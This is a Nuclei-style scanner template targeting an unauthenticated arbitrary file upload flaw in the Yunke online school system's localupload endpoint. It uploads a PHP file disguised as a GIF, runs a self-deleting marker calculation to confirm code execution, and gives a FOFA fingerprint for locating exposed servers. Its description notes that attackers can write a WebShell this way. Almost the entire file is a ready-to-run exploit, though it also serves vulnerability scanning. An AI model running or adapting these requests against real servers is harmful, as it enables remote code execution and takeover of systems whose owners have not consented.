http:
    - raw:
        - "POST /api/uploader/localupload HTTP/1.1\nHost: \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj\n\n------WebKitFormBoundaryFfJZ4PlAZBixjELj\nContent-Disposition: form-data; name=\"file\"; filename=\"{{username}}.php\"\nContent-Type: image/gif\n\n<?php print(1111*2222);unlink(__FILE__);?>\n------WebKitFormBoundaryFfJZ4PlAZBixjELj--\n"
    - matchers:
        - part: body
          type: word
          words:
            - "2468642"
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - "GET /upload/video/0/{{username}}.php HTTP/1.1\nHost: \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36\n"
id: yunkewangxiao-localupload-File-upload
info:
    author: Superhero
    description: |-
        fofa: body="/static/libs/common/jquery.stickyNavbar.min.js"
        云课网校系统 localupload接口存在任意文件上传漏洞，未经身份验证远程攻击者可利用该漏洞代码执行，写入WebShell,进一步控制服务器权限。
    name: 云课网校系统 localupload 任意文件上传漏洞
    reference:
        - https://mp.weixin.qq.com/s/b5e8PAspvYD2Y8Q1dujKhQ
    severity: high
    tags:
        - jQuery
        - 云课网校系统
variables:
    username: '{{to_lower(rand_base(6))}}'
